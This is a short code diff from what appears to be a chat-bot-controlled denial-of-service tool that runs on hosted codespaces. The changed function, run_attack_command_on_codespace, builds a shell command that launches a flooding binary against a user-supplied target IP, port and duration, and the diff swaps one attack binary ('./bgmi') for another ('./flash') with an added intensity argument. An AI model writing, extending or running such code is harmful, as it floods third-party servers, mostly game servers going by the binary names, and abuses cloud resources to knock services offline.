@@ -73,7 +73,7 @@ def add_keys_to_dict(key, duration):
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
-    command = f"./bgmi {target_ip} {target_port} {duration}"
+    command = f"./flash {target_ip} {target_port} {duration} 1200"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
